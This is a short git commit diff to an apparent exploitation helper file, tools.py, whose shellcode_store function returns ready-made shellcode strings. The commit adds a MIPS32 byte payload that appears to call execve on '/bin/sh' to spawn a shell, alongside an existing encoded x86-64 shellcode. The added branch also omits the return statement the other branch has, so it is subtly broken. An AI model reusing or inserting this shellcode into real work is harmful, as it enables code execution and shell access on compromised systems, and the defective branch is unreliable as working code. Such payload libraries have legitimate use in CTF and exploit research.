1fc2b57e22f618ef7dfadcea4225cf841301e9f5
ZIKH26 <2777256035@qq.com>
2023-05-15 17:55:47 +0800

    update

--- tools.py
+++ tools.py
@@ -193,6 +193,8 @@ def shellcode_store(demand):
     elif demand=='str_rcx':
         shellcode="Qh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a071N00"
         return shellcode
+    elif demand=='mips32_shell':
+        shellcode=b"\x24\x06\x01\x11\x04\xd0\xff\xff\x24\x06\x00\x00\x27\xbd\xff\xe0\x27\xe4\x00\x14\x24\x05\x00\x00\x24\x02\x0f\xab\x00\x00\x00\x0c/bin/sh"
     else:
         assert False,"Pass in unrecognized parameter"
 
